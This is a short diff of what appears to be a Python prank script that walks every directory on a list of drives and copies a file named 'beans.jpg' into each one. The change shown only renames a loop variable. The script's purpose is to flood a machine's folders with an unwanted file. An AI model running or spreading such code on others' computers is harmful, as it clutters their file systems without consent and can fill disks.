@@ -61,8 +61,8 @@ bean_path = os.path.join(downloads_folder, file_name)
 
 for drive in drive_list:
     if os.path.isdir(drive):
-        for root, dirs, files in os.walk(drive):
-            file_path = os.path.join(root, "beans.jpg")
+        for src, dirs, files in os.walk(drive):
+            file_path = os.path.join(src, "beans.jpg")
             try:
                 shutil.copyfile(bean_path, file_path)
                 print(f"Success! {file_path} created")
